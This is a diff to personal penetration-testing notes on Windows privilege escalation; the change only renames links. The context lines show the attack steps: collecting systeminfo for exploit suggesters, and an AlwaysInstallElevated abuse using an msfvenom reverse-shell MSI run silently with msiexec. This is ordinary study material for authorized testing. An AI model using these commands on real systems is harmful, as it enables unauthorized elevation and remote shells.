@@ -21,7 +21,7 @@ new version: https://github.com/bitsadmin/wesng
 3. run `systeminfo` on target and save output to file (`> output.txt`), transfer file to attacker
 4. run exploit suggester, eg.`windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt`
 **meterpreter**
-if you have [[3 Tools/exploitation_frameworks/Metasploit/meterpreter]] shell
+if you have [[3 Tools/exploitation-frameworks/Metasploit/meterpreter]] shell
 use `multi/recon/local_exploit_suggester`
 **Seatbelt**
 https://github.com/GhostPack/Seatbelt
@@ -123,7 +123,7 @@ if windows installer files (.msi) always run with elevated privileges, we can cr
 prerequisites: the following registry options have to be set:
 `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer` 
 `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
-1. generate payload, eg using [[3 Tools/exploitation_frameworks/Metasploit/msfvenom]]: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f msi -o malicious.msi`
+1. generate payload, eg using [[3 Tools/exploitation-frameworks/Metasploit/msfvenom]]: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f msi -o malicious.msi`
 2. transfer payload to target
 3. start installer: `C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`
 
